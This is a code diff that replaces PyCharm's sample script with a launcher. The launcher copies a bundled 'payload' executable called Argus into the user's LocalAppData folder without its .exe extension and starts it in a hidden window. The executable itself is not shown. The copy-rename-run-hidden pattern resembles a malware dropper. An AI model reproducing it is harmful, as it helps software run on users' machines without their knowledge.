@@ -1,16 +1,22 @@
-# This is a sample Python script.
+import os
+import shutil
+import subprocess
+from pathlib import Path
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+def main():
+    source_exe = Path(__file__).resolve().parent / "app" / "payload" / "Argus.exe"
 
+    argus_dir = Path(os.environ["LOCALAPPDATA"]) / "Argus"
+    argus_dir.mkdir(parents=True, exist_ok=True)
 
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+    destination_exe = argus_dir / "Argus"
 
+    shutil.copy2(source_exe, destination_exe)
 
-# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    print_hi('PyCharm')
+    subprocess.Popen([str(destination_exe)], creationflags=subprocess.CREATE_NO_WINDOW)
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+    print(f"Copied to: {destination_exe}")
+    print(f"Argus Started")
+
+if __name__ == "__main__":
+    main()
